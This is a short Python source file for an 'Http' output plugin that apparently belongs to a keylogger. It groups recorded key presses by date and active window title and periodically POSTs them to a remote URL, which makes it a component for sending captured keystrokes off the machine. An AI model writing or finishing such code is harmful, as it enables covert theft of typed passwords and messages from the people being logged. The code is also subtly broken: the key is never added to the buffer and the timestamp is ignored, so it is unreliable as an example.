from datetime import date

from plugins.plugin_base import PluginBase
import requests

from plugins.utils.time_delta import TimeDelta


class Http(PluginBase):

    def __init__(self, url=None, headers=None, interval="on_press"):
        if url is None:
            raise IOError("No url specified")

        self.buffer = dict()
        self.interval = TimeDelta().map[interval]
        self.url = url
        self.headers = dict() if headers is None else headers

    def write(self, date_time, window, key):
        if str(date.today()) not in self.buffer:  # check if current date in dict
            self.buffer[str(date.today())] = dict()
        if window not in self.buffer[str(date.today())]:  # check if window already in dict
            self.buffer[str(date.today())][window] = list()

        if self.interval():
            requests.post(self.url, headers=self.headers, data=self.buffer)
            self.buffer = dict()  # clear buffer
